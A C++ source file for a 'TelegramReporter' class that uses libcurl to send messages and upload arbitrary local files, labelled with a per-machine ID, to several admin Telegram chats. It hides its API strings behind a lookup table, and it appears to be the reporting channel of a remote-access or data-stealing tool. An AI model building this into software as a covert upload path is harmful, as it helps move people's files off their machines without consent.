#include "infrastructure/telegram/TelegramReporter.hpp"

#include <curl/curl.h>

#include "domain/common/StringTable.hpp"

namespace nuub::infrastructure::telegram {

static size_t write_callback(char* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append(ptr, size * nmemb);
    return size * nmemb;
}

TelegramReporter::TelegramReporter(std::string token, std::int64_t chat_id, std::string pc_id)
    : token_(std::move(token))
    , chat_id_(chat_id)
    , all_chat_ids_{chat_id}
    , pc_id_(std::move(pc_id))
{
    static std::once_flag curl_init;
    std::call_once(curl_init, []() { curl_global_init(CURL_GLOBAL_DEFAULT); });
}

TelegramReporter::TelegramReporter(std::string token, std::int64_t chat_id, std::string pc_id,
                                   const std::string& encryption_key)
    : token_(std::move(token))
    , chat_id_(chat_id)
    , all_chat_ids_{chat_id}
    , pc_id_(std::move(pc_id))
    , encryption_(encryption_key.empty() ? nullptr : std::make_unique<domain::EncryptedChannel>(encryption_key))
{
    static std::once_flag curl_init;
    std::call_once(curl_init, []() { curl_global_init(CURL_GLOBAL_DEFAULT); });
}

TelegramReporter::TelegramReporter(std::string token, std::vector<std::int64_t> chat_ids,
                                   std::string pc_id, const std::string& encryption_key)
    : token_(std::move(token))
    , chat_id_(chat_ids.empty() ? 0 : chat_ids[0])
    , all_chat_ids_(std::move(chat_ids))
    , pc_id_(std::move(pc_id))
    , encryption_(encryption_key.empty() ? nullptr : std::make_unique<domain::EncryptedChannel>(encryption_key))
{
    static std::once_flag curl_init;
    std::call_once(curl_init, []() { curl_global_init(CURL_GLOBAL_DEFAULT); });
}

std::string TelegramReporter::api_call(const std::string& method, const std::string& params) {
    std::lock_guard lock(curl_mutex_);

    std::string tg_api = domain::StringTable::get("tg_api");
    std::string url = tg_api + token_ + "/" + method;
    std::string response;

    CURL* curl = curl_easy_init();
    if (!curl) return {};

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);

    if (!params.empty()) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, params.size());
    }

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? response : "";
}

void TelegramReporter::send_to_chat(std::int64_t chat_id, const std::string& text) {
    std::string params = "chat_id=" + std::to_string(chat_id) +
                         "&text=" + text;

    std::string tg_api = domain::StringTable::get("tg_api");
    std::string url = tg_api + token_ + "/sendMessage";

    CURL* curl = curl_easy_init();
    if (!curl) return;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, params.size());

    // Discard response
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    std::string dummy;
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &dummy);

    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
}

void TelegramReporter::send_message(const std::string& text) {
    std::lock_guard lock(curl_mutex_);

    std::string full_text = "[" + pc_id_ + "] " + text;

    // Send to ALL admin chat IDs (broadcast)
    for (std::int64_t cid : all_chat_ids_) {
        send_to_chat(cid, full_text);
    }
}

bool TelegramReporter::send_file(const std::string& path, const std::string& caption) {
    std::lock_guard lock(curl_mutex_);

    std::string tg_api = domain::StringTable::get("tg_api");
    std::string send_doc = domain::StringTable::get("tg_send_doc");
    std::string url = tg_api + token_ + send_doc;

    // Send file to ALL admin chat IDs
    bool all_ok = true;
    for (std::int64_t cid : all_chat_ids_) {
        CURL* curl = curl_easy_init();
        if (!curl) { all_ok = false; continue; }

        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part;

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "chat_id");
        curl_mime_data(part, std::to_string(cid).c_str(), CURL_ZERO_TERMINATED);

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "caption");
        std::string full_caption = "[" + pc_id_ + "] " + caption;
        curl_mime_data(part, full_caption.c_str(), CURL_ZERO_TERMINATED);

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "document");
        curl_mime_filedata(part, path.c_str());

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);

        CURLcode res = curl_easy_perform(curl);
        curl_mime_free(mime);
        curl_easy_cleanup(curl);

        if (res != CURLE_OK) all_ok = false;
    }

    return all_ok;
}

} // namespace nuub::infrastructure::telegram
